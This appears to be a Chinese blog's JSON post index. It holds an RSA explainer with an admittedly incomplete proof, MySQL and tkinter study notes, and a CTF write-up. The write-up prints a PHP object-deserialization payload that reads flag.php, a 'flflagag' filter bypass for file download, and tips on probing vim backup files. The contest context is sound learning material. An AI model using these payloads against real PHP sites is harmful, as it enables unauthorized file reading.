p、q、n、φ（n），e1，e2\n\n公钥用到了n，e1，只要我们能找到e2，就攻破了RSA。那么有没有可能通过这两个数找到e2呢？先看看e2是怎么来的\n\n> e1 * e2 mod φ（n） = 1\n\n根据公式可以知道我们得到φ（n）就可以得到e2，那么φ（n）又是怎么来的呢？\n\n> φ（n）= （p-1）&#42;（q-1）\n\n我们又需要得到p、q，再来\n\n> n = p * q\n\n总算到了（开森）！我们只需要分解n就行了！！唉，不得不说，千里之堤毁于蚁穴，大名鼎鼎的RSA居然栽在了这么简单的问题上，哈哈哈！！\n\n但是~~，如果你真的觉得你就此就破解了RSA，那你真是Too Young Too Simple，分解我的n=35，洒洒水的难度，那么，请你给我分解一下下面这个数字怎么样、\n\n> 152564564212344523123146785123123456484887123121231234567874645645132165867845456456456545645645123123123156445564523121322312312345645456456565656565\n\n有办法吗？事实上，分解这些大数的因子是非常非常困难的，以目前的计算能力，分解1024位的大数需要两年，分解2048位的大数需要80年，远超数据本身的价值，这就是RSA算法牢不可破的真实原因，就是建立在大数分解困难的基础上的，所以今后如果计算能力提高，或者找到其它简单算法来分解大数，那么RSA算法安全性就消失了。\n\n\n----------\n\n\n**理论解释**\n\n是不是觉得刚刚的东西很神奇？！！，对，就是这么神奇，这背后都是伟大的数学家的功劳，虽然我不喜欢数学，但还是很佩服他们可以搞出这么骚的东西。废话不多说，来慢慢解释一下，鉴于我的数学水平...\n\n> 数学解释只解释了所应用的数学原理，不再对数学原理进行证明，如果感兴趣的话可以自己证明之。\n\n大名鼎鼎的 *欧拉定理* \n\n> 若n,a为正整数，且n,a互质，则\n> $a^{φ(n)} ≡ 1 （mod \\; n）$ \n\nφ（n）为 *欧拉函数* ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质\n\n> 如果n可以分解为两个互质的整数p、q的乘积，那么有\n> φ（n）= (p-1) * (q-1)\n\n接下来要证明的就是为什么下面两个式子可以互换实现\n\n> B=A^e1   mod n\n> A=B^e2   mod n\n\n解密规则为\n\n> A=B^e2 mod n\n\n根据加密规则\n\n> B = A^e1 mod n\n> B = A^e1 - kn\n\n代入解密式中\n\n> (A^e1 - kn)^e2 ≡ A （mod n）\n\n等于证\n\n> $A^{e1&#42;e2} ≡ m （mod \\; n）$，（对于这一步我并不知道为什么）\n\n\n由 *欧拉定理* 可以得到\n\n> e1&#42;e2 ≡ 1  [ mod φ（n）]\n> e1&#42;e2 ≡ hφ（n）+1\n\n代入前面的式子可以得到\n\n> $A^{hφ（n）+1} \\;= m (mod\\;n)$\n\n接下来证明上述恒等式\n\n分两种情况\n\n1、A和n互质\n \n由欧拉定理\n\n> $A^{φ（n）}≡1（mod\\;n）$ \n\n代入前式可以得到\n\n> ${(A^{φ（n）})}^{h}&#42;A \\;= m (mod\\;n)$\n\n原式得证\n\n2、A和n不互质\n\n> 自己开发吧老铁，我不想写了。而且我也不怎么会。\n\n\n----------\n\nRSA其实并不难，想要掌握它并不需要很高的数学基础，认真学一学还是可以学的明白的，废话不多说，赶紧练习一波去也！","tags":["RSA"],"categories":["资料"]},{"title":"CUMT-CTF2017冬","url":"/2018/01/27/cumtctf2017/","content":"第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。\n<!--more-->\n0x1  what？？\n--\n一个代码审计问题,与反序列化有关\n\n``` PHP\n<?php  \n@error_reporting(1); \nclass sky \n{      \n    protected $skyobj;  \n    function __construct() \n    {          \n        $this->skyobj = new sec;     \n       }  \n    function __toString()      \n    {          \n        if (isset($this->skyobj))  \n            return $this->skyobj->read();      \n    }  \n}  \n\nclass nosec \n{    \n    public $filename;      \n    function read()      \n    {    \n        $file = \"./{$this->filename}\";        \n        if (file_get_contents($file))         \n        {              \n            return file_get_contents($file); \n        }  \n        else \n        { \n            return \"you must be joking!\"; \n        }      \n    }  \n}  \n  \nclass sec \n{  \n    function read()     \n    {          \n        return \"it's so sec~~\";      \n    }  \n}  \n\nif (isset($_GET['data']))  \n{ \n    $Input_data = unserialize($_GET['data']);  \n    echo $Input_data; \n}\n?>\n```\nPHP序列化的目的旨在实现不同的PHP文件之间的对象传递，在序列化对象创建之前，如果类中定义了&#95;&#95;sleep()函数，则会调用该函数，而在序列化对象创建时则会调用&#95;&#95;wakeup()函数（如果定义了的话），当然，还有PHP许多其他的魔法方法。\n分析一下，该例中关键应该在read函数上，但是必须要调用到nosec才可以实现，该例中sky类中默认创建sec类，显示是不行的，必须要创建出nosec才可以用。\n\n**payload**\n\n``` php\n<?php  \n@error_reporting(1); \nclass sky \n{      \n    protected $skyobj;  \n    function __construct() \n    {          \n        $this->skyobj = new nosec;//在此处更改对象，实现对象的绕过     \n       }  \n    function __toString()      \n    {          \n        if (isset($this->skyobj))  \n            return $this->skyobj->read();      \n    }  \n}  \n\nclass nosec \n{    \n    public $filename='flag.php';      \n}\n$obj = new sky();\necho urlencode(serialize($obj)) //千万记住url编码，真的太多坑！！！！\n?>\n```\n\n> O%3A3%3A%22sky%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A5%3A%22nosec%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D\n\n直接提交上去即可获得编码。\n注意：以后一定要多检查元素，当时好像已经做出来了 ，可惜这个flag居然藏在控制台里面。\n同理，还可以利用该函数的特性去实现写文件等等操作。\n\n\n\n0x2  代码混淆\n--\n\n有个小知识点，vim会自动产生备份文件，比如文件名为submit.php，则产生的文件可能为.submit.swp，submit.php~，submit.php.bak多试试。\n然后就开始解混淆代码。\n\n\n解混淆代码的时候，应该先把变量名提取出来，可以通过下面的代码dump变量出来\n\n``` php\n<?php\ninclude \"index.php\";\nvar_dump(get_defined_vars());\n?>\n```\n恢复出来的关键代码如下\n\n``` php\n$IIIIIIIIIIll = @$_GET['img_tet'];\n$IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll);\n$IIIIIIIIIIll = str_replace('flag',\"\",$IIIIIIIIIIll);\n\nif ($IIIIIIIIIIll!=\"\")\n{\n    header('Content-Type: imgage/jpeg');\n    header('Content-Disposition: attachment; filename='.$IIIIIIIIIIll);\n    header('Content-Lengh: '.filesize($IIIIIIIIIIll));\n    $IIIIIIIIII11 = fopen($IIIIIIIIIIll,\"r\") or die(\"Unable to open file!\");\n    $IIIIIIIIIlIl = fread($IIIIIIIIII11,filesize($IIIIIIIIIIll));\n    fclose($IIIIIIIIII11);\n    echo $IIIIIIIIIlIl;\n}\n```\n题目过滤flag，所以可以用flflagag绕过，即可得到flag，这个题其实也不难，只是毕竟是我第一次，需要纪念一下。\n","tags":["CTF"],"categories":["writeup"]},{"title":"MySQL学习笔记(三)","url":"/2018/01/18/mysql3/","content":"Mysql操作表,例如SELECT语句等。\n<!--more-->\n\n### SELECT语句\n```\nselect\n\t[all|distinct|distinctrow] # 指定是否重复行应被返回，如不指定默认值为all\n\t[high_priority] # 优先级设置\n\t[straight_join] # 促使mysql把表联合在一起,加快查询速度\n\t[sql_small_result] [sql_big_result] [sql_buffer_result] # 设置结果集的显示\n\t[sql_cache|sql_no_cache] [sql_calc_found_rows] # cache指定是否要把结果集存储在查询表缓存中，第三个选项指定结果集的行数，忽略limit\n\t列名表达式 ...\n\t[from 表或视图 ... [...]]\n\t[where 条件]\n\t[group by {列名|表达式|position} [asc|desc],... [with rollup]]\n\t[having 条件]\n\t[order by {列名|表达式|position} [asc|desc],...]\n\t[limit {[offset,] row_count|row_count OFFSET offset}]\n\t[procedure 存储过程名(参数...)]\n\t[into outfile '文件名' [character set 字符集]  # 将表中的行导出到文件中\n\texport_options|into dumpfile '文件名'|info 变量名 ...]\n\t[for update|lock in share mode]] # 对结果集加锁，for update更推荐\n```\n* * * * * * * *\n### 选择列\n**as 指定列别名**\n\n```\nselect 学号 as number from stu;   # 指定结果集别名\n```\n替换查询结果中的数据\n```\ncase\n\twhen 条件1 then 表达式1\n\twhen 条件2 then 表达式2\n\t...\n\telse 表达式n\nend\nEXP:\n\tselect 编号,姓名\n\tcase\n\t when 编号 is null then 'ff'\n\t else 'ok'\n\tend\n\tfrom stuinfo;\n```\n**计算列值**\n```\nselect 表达式 ...  # 可以进行加减乘除取余%等运算\nexp：\nselect 学号,成绩*1.2 from xs where ID=1;\n```\n#### 聚合函数(aggregation function)\n  \n**聚合函数常用于对一组值进行计算，返回单个值，通常与group by子句一起使用,作用于列**\n\n|函数名|说明|语法|备注|\n|:---:|---|---|---|\n|count|求组中系数，返回int类型数据|count({[all&#124;distinct] 表达式}&#124;*)|&#42;将返回检索行总数目，包括其值包含null|\n|max|求最大值|max([all&#124;distinct] 表达式)|数据类型可以是数字、字符和时间日期类型|\n|min|求最小值|略||\n|sum|返回表中所有值的和|sum/avg([all&#124;distinct] 表达式)||\n|avg|组中平均值|||\n|std/stddev|返回标准差|||\n|variance|方差|||\n|group_concat|返回由属于一组的列值连接组合而成的结果|用法略|该函数返回指定列的所有非NULL值，中间用逗号隔开，长度最大限制1024|\n|bit_and|逻辑或 |||\n|bit_or|逻辑与|||\n|bit_xor|逻辑异或||||\n\n\n### FROM子句\n```\nfrom table_reference ...\n\ttable_reference:\n表名 [[as] 表名别名] [{use|ignore|force} index (key_list)]  /*查询表，use指使用索引，ignore指忽略索引*/\n|join_table                                                /*连接表*/\n\n```\n**多表连接**\n1)全连接，实质是表的等值连接\n这种连接会产生所有可能的组合，也就是每个表的行数之积\n“select 编号,ID from stuinfo,student;”这样会返回两个表行数之积,通常需要用where语句限制结果行数\n2)JOIN连接\n```\njoin_table:\n\ttable_reference [inner|cross] join table_factor [join_condition]\n\t|table_reference straight_join table_factor\n\t|table_reference straight_join table_factor on conditional_expr\n\t|table_reference {LEFT|RIGHT} [outer] join table_reference join_condition\n\t|table_reference natural [{LEFT|RIGHT} [outer]] join_table_factor\n```\ntable_reference指定要连接的表名\njoin_condition：\n```\non 条件\n|using (列...)\n```\non条件主要用于连接表，其他不属于连接表的条件可以使用where子句来指定，inner指内连接，是系统默认的方式。\nexp:\n```\nselect 编号,ID from stuinfo join student;\n```\njoin还可以将自身进行连接，称为自连接，但是要指定不同的别名\n### WHERE子句\nwhere子句必须紧跟在from子句之后，用于确定选取行\n\n```\nwhere 条件\n```\n其中条件为查询语句\n```\n条件=:\n\t<precdicate>                             \n\t|<precdicate>{and|or}<precdicate>\n\t|(条件)\n\t|not 条件\n```\nprecidicate为判定运算，结果又TRUE，FALSE或UNKNOWN\n```\n<precdicate>:\n\t表达式 {=|<|<=|>=|<=>|<>|!=} 表达式                    # \"<=>\"相等或都等于空返回true，否则返回false，绝不会返回unknown  \n\t|表达式 [not] like 表达式 [escape 'escape_character']\n\t|表达式 [not] [regexp|rlike] 表达式\n\t|表达式 [not] between 表达式 and 表达式\n\t|表达式 is [not] null\n\t|表达式[not] in (subquery |表达式[,...n])\n\t|表达式 =|<|<=|>=|<=>|<>|!=} {all|some|any} (subquery)\n\t|exist (子查询)\n```\n**模式匹配**\n\n#### 1)like运算符 \n\n```\n表达式 [not] like 表达式 [escape 'escape_character']\n```\n模式匹配时，可用%和\\_进行模糊查询，%代表0个或多个字符,符号\\_代表单个字符\nescape 转义字符，例如当要匹配的字符串中有_或%时，此时应通过该字符前的转义字符指明其为模式串中的字符，使用escape可以指定转义字符\n\n#### 2)regexp(正则表达式)，是mysql的一个功能。　\n\n```\nmatch_exp [not][regexp|rlike] match_exp\n```\n|特殊字符|含义|\n|:---:|:---:|\n|^|匹配字符串的开始部分|\n|$|匹配字符串结束部分|\n|.|匹配任何一个字符|\n|\\*|匹配\\*之前的0个或多个字符的任何序列|\n|+|匹配+之前的1个或多个字符的任何序列|\n|?|匹配？之前的0个或多个字符|\n|{n}|匹配括号前的内容出现n次的序列|\n|()|匹配括号里的内容|\n|[abc]|略|\n|[a-z]|略|\n|[^a-z]|略|\n|&#124;|匹配符号左边或右边出现的字符串|\n|[[..]]|匹配方括号里出现的符号|\n|[[:<:]和[[:>:]]|匹配一个单词的开始和结束|\n|[[:]|匹配方括号里出现的字符串中的任意一个字符|\n**范围比较(between或者in)**\n```\nexp [not] between exp1 and exp2   # exp1必须小于exp2，表达式也可是字符串\nexp in (exps [,...n])             # 该关键字主要用于表达子查询\n```\n**空值比较**\n```\nexp is [not] null\n```\n**子查询**\n\t指使用另一个查询的结果作为条件的一部分，即查询的嵌套\n#### 1)in子查询 \n\n```\nexp [not] in (subquery)\n```\nin子查询只能返回一列数据，对于较复杂的查询可使用嵌套的子查询\n#### 2)比较子查询（使表达式的值与子查询的结果进行比较运算）\n\n```\n表达式 {<|<=|=|>|>=|!=|<>} {all|some|any} (subquery)\n```\nall指定表达式要与结果集的每个值都进行比较，全部满足时才返回true，否则返回false。\nsome与any同义，找到满足的值就会返回true，否则返回false。\n\n#### 3)exists子查询 \n判断查询结果集是否为空表\n\n```\n[not] exists (subquery)\n```\n以上各种子查询还可用在select的其他子句中，例如from语句，但是必须为子查询产生的一个中表定义一个别名\n\n### GROUP BY子句 \n\n根据字段进行分组，所要查找的内容不得多于分组数\n```\ngroup by {列名|表达式|position} [asc|desc],... [with rollup]\n```\nrollup用于对group by子句指定的各列产生汇总行。\n\n**举例**\n\n```sql\nselect name,username from student where job='信息安全' group by username;\n```\n\n上述语句执行时会报错，原因在于\n\n> *group by* 语句的执行过程为先执行group by子句，然后对gruop by 语句的汇总行再进行操作，本例中group by子句执行后只产生了一列(列名为username)，所以执行到查询name字段时会无法查询从而报错。\n> 但是这个时候可以使用聚合函数来查询其他字段的信息，因为聚合函数可以作用于所有列，当然也可以增加group by 子句的字段\n\n\t\n**用例解析**\n\n```\nselect 专业,性别,count(编号) from stuinfo group by 专业,性别 with rollup;\n```\n**返回结果**\n\n|专业     | 性别 | count(编号) |\n|:---:|:---:|:---:|\n| 信息安全 | 女   |           1 |\n| 信息安全 | 男   |           4 |\n| 信息安全 | NULL |           5 |\n| 土木工程 | 男   |           6 |\n| 土木工程 | NULL |           6 |\n| 计算机   | 女   |           3 |\n| 计算机   | 男   |           6 |\n| 计算机   | NULL |           9 |\n| NULL     | NULL |          20|\n\n```\nselect 专业,性别,count(编号) from stuinfo group by 性别,专业 with rollup;\n```\n\n**返回结果**\n\n| 专业     | 性别 | count(编号) |\n|:----:|:----:|:----:|\n| 信息安全 | 女   |           1 |\n| 计算机   | 女   |           3 |\n| NULL     | 女   |           4 |\n| 信息安全 | 男   |           4 |\n| 土木工程 | 男   |           6 |\n| 计算机   | 男   |           6 |\n| NULL     | 男   |          16 |\n| NULL     | NULL |          20 |\n\n以上两个查询语句只是group by语句后面的顺序不同，该语句的组织方式是按列的排序的逆序进行汇总，例如第一例先对性别字段产生了汇总（针对专业相同的行），然后对专业名和性别名均不同的行产生了汇总行，如果列数是多列的话，也依然会这样依次汇总。\n\n### HAVING子句\n\nHAVING子句用于在group by子句后选择行，和WHERE子句类似，where子句用于在*from*  子句后选择行，区别是<font face=\"楷体\"> having子句可以作用于聚合函数，而where子句不可以</font>。\n**语法格式**\n\n``` sql\nhaving 条件\n```\n\n**举例**\n\n```sql\nselect 专业,avg(年龄) from stuinfo where 年龄 < 96 group by 专业 having avg(年龄);\n```\n\n### ORDER BY子句\n如果不适用order by子句的话，结果集中的行的顺序将是不可预料的，使用该语句行可以对行的排序顺序方式进行指定，如果order by子句后面指定了多个条件，则会按照逆序方向依次排序。\n```sql\norder by {列名|表达式|position} [asc|desc], ...\n```\n<font face=\"fantasy\">position</font> 表示结果集中该位置的列排序，是一个正整数。\n\n**举例**\n\n```sql\nselect * from stuinfo order by 年龄;  # 根据年龄来排序\n```\n\n### LIMIT子句\n\nLIMIT子句用来限制 *select*  语句返回的行数。\n\n**语法格式**\n\n```sql\nLIMIT {[offset,] row_count | row_count OFFSET offset}\n```\n说明：\n\n> *offset* 为对于结果集首行的偏移量（首行偏移量为0），如offset=3，则会从第四行开始返回数据。\n\n**举例**\n\n```sql\nselect * from stuinfo where 专业='信息安全' limit 1,2;\nselect * from stuinfo where 专业='信息安全' limit 2 offset 1; # 这两个语句是等价的\n```\n\n### UNION语句\n\n<code>UNION</code> 语句用来把多个 *select* 语句返回的结果组合到一个结果集中。\n\n**语法格式**\n\n```sql\nselect ...\nunion [ALL | DISTINCT] select ...\n[ union [ALL | DISTINCT] select ... ]\n```\n\n**说明**\n\nselect语句为常规的select语句，但是必须遵守以下规则\n\n> 1、各个select语句对应位置的列应该具有相同的列名、类型和数目，\n> 2、只有最后一个select语句可以使用 <code>into outfile</code>\n> 3、<code>order by</code> 和 <code>limit</code> 只能在整个语句最后指定，并对整个最终结果起作用。\n> 4、使用union语句的时候，MySQL会自动剔除重复数据，所以<code>distinct</code>可以省去。\n\n**举例**\n\n``` sql\nselect * from stuinfo where 专业='信息安全' union select * from stuinfo where 专业='土木工程' order by 5 limit 6;\n```\n\n### HANDLER 语句\n\n前面使用的 <code>select</code> 语句通常用来返回行的集合，MySQL中还有另外一个可以返回行的语句： *handler* 语句。它能够一行一行的浏览表中的数据，这不是SQL标准，而是MySQL 的一个扩展，只适用于MyISAM表和InnoDB表。\n使用该语句时要先打开一个表，然后在读这个表，使用完之后还必须关闭已经打开的表。\n\n  1、打开一个表\n \n**语法格式**\n\n```sql\n\thandler tablename open [ [ as ] 别名 ];    # as用于指定别名\n```\n\n2、 浏览表中的行\n\n**语法格式1**\n \n```sql\n\thandler tablename read { first | next } [where 条件] [limit ...];\n```\n注意：此处的<code>limit</code> 字段用来控制返回的结果语句的行数，默认只有一行。\n\n**语法格式2**\n\t\n```sql\n\t handler tablename read 索引名 {<|>|=|...} (值...)\n\t\t [where 条件] [limit ...];     # 以比较运算符为索引读取行\n\t handler tablename read 索引名 {first | next | prev | last }\n\t\t [where 条件] [limit ...];     # 以关键字来读取行\n```\n 3、关闭打开的表\n\n**语法格式**\n\n```sql\nhandler tablename close;\n```\n\n### 视图（view）\n\n此处只对视图进行简单的介绍。\n视图是从一个或多个表（视图）中导出（通过查询方式）的表，是一个 *虚表* ，即数据库中只存储视图的结构不存储具体数据，需要时再在表中进行查询使用。使用方便，安全性高。\n\n**语法格式**\n\n```sql\ncreate\n[or replace] # 用replace能替代同名视图\n[definer = {user|current_user}]\nview 视图名 [(列名 ...)]\nAS select 语句\n[with [cascaded|local] check option]\n```\n执行查询、修改、删除等操作时与对表的操作类似。","tags":["SQL"],"categories":["资料"]},{"title":"MySQL学习笔记(二)","url":"/2018/01/07/mysql2/","content":"Mysql数据库的增删查改\n<!--more-->\n### MYSQL基本命令\n\n|命令|解释|备注|\n|---|---|---|\n|show variables like 'char%';|显示系统中带有char字符的系统参数||\n|set character_set_client gbk;|设置客户端编码方式为GBK||\n|status;|显示当前系统信息||\n|delimiter $$|修改命令结束符号为$$|想要恢复；作为结束符使用 opdelimiter ;|\n* * * * * * *\n\n### 数据库语句\n\n**创建数据库**\n```\ncreate [database|schema] [if not existe] databasename\n[options ...]\n```\n-------------\n**修改数据库**\n```\nALTER [DATABASE|SCHEMA] [DATABASENAME]\n\tOPTION ...\n```\n此命令用于修改数据库的全局特性，这些特性存在db.opt文件中，如果语句中忽略数据库名，则会修改当前数据库\n示例代码\n```\nalter database xscj\ndefault charcter set gb2312;\n```\n\n**删除数据库**\nDROP DATABASE DATABASENAME\n* * * * * * *\n### 表结构操作语句\n\n#### 创建表\n```\ncreate [temporary] table [if not exists] user(\n\tid int auto_increment not null primary key,\n\tusername varchar(10) not null\n);  # 使用ifnot...从句可以不显示错误信息\n\t# unique key也可以表示字段名唯一\n```\n\n\n#### 插入语句\n```\ninsert into tablename values(1,'Tom')  # 字符串串值需要用引号括起来\n```\n\n\n#### 复制现成的表\n```\nCREATE TABLE TABLE_NAME LIKE HAVED_TABLE; # 该命令会复制一个与已有表结构相同的空表\nCREATE TABLE TABLE_NAME AS (表达式ex：select * from haved_table); \n\t# 该命令是复制表达内容，但是表达式和索引不会复制，只会复制内容部分，例如主键特性就不会被复制\n```\n\n#### 修改表\n\n##### 修改表结构\n\n```\nALTER [IGNORE] TABLE table_name\n\toption ...\nOPTIOIN:\nADD [COLUMN] 列定义 [FIRST|AFTER 列名]\t\t\t/*添加列*/\nALTER [COLUMN] 列名 {SET DEFAULT literal|DROP DEAFAULT}\t\t\t/*修改默认值*/\nCHANGE [COLUMN] 列名 愿列名 [FIRST|AFTER 列名]\t\t\t\t/*列名重定义*/\nMODIFY [COLUMN] 列定义 [FIRST|AFTER 列名]\t\t\t/*修改列数据类型*/\nDROP [COLUMN] 列名 \t\t\t\t/*删除列*/\nRANAME [TO] 列表名\t\t\t\t/*重命名该表*/\nORDER BY 列名 \t\t\t\t\t/*排序*/\nCONVERT TO CHARACTER SET 字符集名 [COLLATE 校对规则名] \t\t/*将字符集转换为二进制*/\n[DEFAULT] CHARACTER SET 字符集名 [COLLATE 校对规则名]\t\t\t/*修改默认字符集*/\n```\n\n**示例代码**\n```sql\n1.alter table xs add column 性别 bit not null after 姓名;      \t# 注意列名不加引号，加了会报错\n2.alter table xs change 备注 backup char(10);\t\t\t\t\t# 修改列名，先给出原列名，注意后面必须要加新列名的数据类型\n3.alter table xs modify backup char(11);\t\t\t\t\t\t# 修改列的数据类型，但是如果新的数据类型与所存的数据类型冲突则会错误\n```\n对于多条命令可以用，号隔开\n```\nalter table xs\n\tadd 年级 tinyint,\n\tdrop column 姓名;\n```\n\n##### 更改表名\n\n```\nRENAME TABLE 老表名 TO 新表名\t\t\t\t\t\t\t\t\t\t/*多个命令之间用逗号隔开*/\n```\n\n#### 删除表\n\n```\nDROP [TEMPORARY] TABLE [IF EXISTS] 表名\n```\n\n#### 表结构特点\n\n1.表达空值与数值数据0或者空字符混为一谈，任意两个空值都不相等\n2.长度小于4的varchar被改变为char\n3.隐含的改变列类型\n\n* * * * * * *\n\n### 表记录操作\n\n#### 插入记录\n4.1 插入新纪录\n\n```\nINSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] {%raw%}[IGNORE]{%endraw%}  # low,delayed等表示该操作的优先级\n\t[INTO] 表名 [(列名,...)]\n\tVALUES({expr|default},...),(,...),...\n\t|SET 列名={expr|default},...\n    [ON DUPLICATE KEY UPDATE 列名=expr,..] # 该语句作用是如果发生unique key或primary key或primary出现重复，则按照该语句指定的列插入\n```\n\n4.2 从已有表中插入新记录\n\n```\nINSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] {%raw%}[IGNORE]{%endraw%}\n\t[INTO] 表名 [(列名,...)]\n\tSELECT 语句\n\t[ON DUPLICATE KEY UPDATE 列名=expr,..] \n```\n\n4.3 替换旧记录\tREPLACE\n\t语句与insert相同，该语句会在插入之前将与新纪录冲突的旧记录删除，从而插入新数据\n4.4 插入图片可以插入路径或者直接存储图片本身(使用load_file()函数，参数为图片路径)\n\n#### 修改记录\n**4.1 修改单个表**\n\n```\nUPDATE [LOW_PRIORITY] [IGNORE] 表名\n\tSET 列名1=expr1[,列名2=expr2...]\n\t[WHERE 条件]      # 若没有设定，则会更新所有区行\n\t[ORDER BY　...]\n\t[LIMIT row_count]\n```\n\n**4.2 修改多个表**\n\n```\nUPDATE [LOW_PRIORITY] [IGNORE] 表名1,表名2,...\n\tSET 列名1=expr1[,列名2=expr2...]\n\t[WHERE 条件]\n```\n\n#### 删除记录\n\n##### 4.1单表操作\n\n```\ndelete [low_priority] [quick] from 表名     # quick修饰符可以加快部分删除操作的速度\n\t[where 条件]\n\t[order by ...]\n\t[limit row_count]\n```\n\n##### 2.多个表中操作\n\n```\ndelete [low_priority] [quick] [ignore] 表名[.*][,表名[.*]...]\n\tfrom table_references\n\t[where ]             该语句删除from子句之前的表中的内容\n```\n\n##### 或者\n```\ndelete [low_priority] [quick] [ignore]  # 该语句删除from子句中的表中的内容\n\tfrom 表名[.*][,表名[.*]...]\n\tusing table_references\n\t[where]\n```\n\n##### EXAMPE：\n```\ndelete user1,user2\n\tfrom user1,user2,user\n\twhere user1.id=user.id and user2.id=user.id\n```\n\n##### 清除表数据\n\n```\ntruncate table 表名     # 清空表\n```\n\n### 数据库信息显示\n\n<img src=\"mysql2/1.jpg\"  height=\"600\" width=\"495\">","tags":["SQL"],"categories":["资料"]},{"title":"MySQL学习笔记(一)","url":"/2018/01/01/Mysqldatatype/","content":"MySQL数据类型\n<!--more-->\n### MySQL数据类型\n\n    在MYSQL数据类型主要有文本、数字、时间/日期类型\n\n#### Numbe类型 \n\n|数据类型           |描述      \n|------------------|---------------------------------------------------------------------------------------------------------                \n|TINYINT(size)     |-128 到 127 常规。0 到 255 无符号*。在括号中规定最大位数。\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n|SMALLINT(size)    |-32768 到 32767 常规。0 到 65535 无符号*。在括号中规定最大位数。\t\t\t\t\t\t\t\t\t\t\t\t\n|MEDIUMINT(size)   |-8388608 到 8388607 普通。0 to 16777215 无符号*。在括号中规定最大位数。                                        \n|INT(size)         |-2147483648 到 2147483647 常规。0 到 4294967295 无符号*。在括号中规定最大位数。\n|BIGINT(size)      |-9223372036854775808 到 9223372036854775807 常规。0 到 18446744073709551615 无符号*。在括号中规定最大位数。\n|FLOAT(size,d)     |带有浮动小数点的小数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。\n|REAL(length,d)    |和FLOAT类型差不多，运算速度快，但是精度有限。\n|DOUBLE(size,d)    |带有浮动小数点的大数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。\n|DECIMAL(size,d)   |作为字符串存储的 DOUBLE 类型，允许固定的小数点\n|BIT[M]            |该数据类型在数据库中以1,0的形式存储，因此修改时只能用1,0或者true/false来存储\n\n#### Date类型\n\n|数据类型         \t|描述\n|-------------------|-------------------------------------------------------------------------------------------------------\n|DATE()\t        \t|日期。格式：YYYY-MM-DD //注释：支持的范围是从 '1000-01-01' 到 '9999-12-31'\n|DATETIME()\t\t\t|日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 '1000-01-01 00:00:00' 到 '9999-12-31 23:59:59'\n|TIMESTAMP()\t\t|时间戳。TIMESTAMP 值使用 Unix 纪元('1970-01-01 00:00:00' UTC) 至今的描述来存储。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 '1970-01-01 00:00:01' UTC 到 '2038-01-09 03:14:07' UTC\n|TIME()\t\t\t\t|时间。格式：HH:MM:SS 注释：支持的范围是从 '-838:59:59' 到 '838:59:59'\n|YEAR()\t\t\t\t|2 位或 4 位格式的年。 // 注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。\n\n#### Text类型\n\n|数据类型\t        |描述\n|-------------------|--------------------------------------------------------------------------------------------------\n|CHAR(size)\t\t\t|保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。\n|VARCHAR(size)\t\t|保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。 // 注释：如果值的长度大于 255，则被转换为 TEXT 类型。\n|TINYTEXT\t\t\t|存放最大长度为 255 个字符的字符串。\n|TEXT\t\t\t\t|存放最大长度为 65,535 个字符的字符串。\n|BLOB\t\t\t\t|用于 BLOBs (Binary Large OBjects)。存放最多 65,535 字节的数据。\n|MEDIUMTEXT\t\t\t|存放最大长度为 16,777,215 个字符的字符串。\n|MEDIUMBLOB\t\t\t|用于 BLOBs (Binary Large OBjects)。存放最多 16,777,215 字节的数据。\n|LONGTEXT\t\t\t|存放最大长度为 4,294,967,295 个字符的字符串。\n|LONGBLOB\t\t\t|用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。\n|ENUM(x,y,z,etc.)\t|允许你输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。//注释：这些值是按照你输入的顺序存储的。可以按照此格式输入可能的值：ENUM('X','Y','Z')\n|SET\t\t\t\t|与 ENUM 类似，SET 最多只能包含 64 个列表项，不过 SET 可存储一个以上的值。","tags":["SQL"],"categories":["资料"]},{"title":"tkinter","url":"/2017/12/20/tkinter/","content":"最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。\n<!--more-->\n\n**简单开始**\n```\nfrom tkinter import *\nroot = Tk()\nroot.title(\"start\")\nroot.mainloop()\n```\n\n[参考文档](http://effbot.org/tkinterbook/)\n\n----------\n\n该模块中对于控件的放置支持三种方法\n pack方法\n> pack的放置是基于块的思想来实现的，每一个块放置后系统会自动填充到目标窗体中，可以通过属性来改变其放置的位置，属于tkinter中比较常用的一种方法。注意frame控件属于pack()方法的内容，不能够和其它方法混用。\n\n常用参数：\n\n|参数|说明|\n|:---:|---|\n|anchor|设置对齐方式，以地理坐标的方式，参数有E,W,N,S(东南西北),EN,ES,WE,WS,W+E+S+N|\n|fill|填充方向，可以选择X方向，Y方向，BOTH指两个方向都包含|\n|expand|设置是否扩充|\n|ipadx|x内边距|\n|ipady|y内边距|\n|padx|x外边距|\n|pady|y外边距|\n|side|放置大致方位|\n\ngrid方法\n\n> grid方法对于控件的放置是基于表格的形式来放置，但是通过row，column选项可以控制控件的位置，注意row或者column选项值相等的控件会水平或竖直对齐。\n\nplace方法\n\n> 该方法通过指定在屏幕上的x，y值来控制控件的位置，可以实现非常精确的控制，但是这种方法编写非常复杂，所以不推荐这种方法。\n\n注意：这三种方法不能再一个窗口中混用，尤其是pack和grid方法，如果混用会报错。而且会导致控件放置错乱。\n\n\n----------\n\n\n对于treeview视图，贴个网址，我感觉就应该足够了\n[点我](https://www.jianshu.com/p/6a37d33e96a2)\n\n## 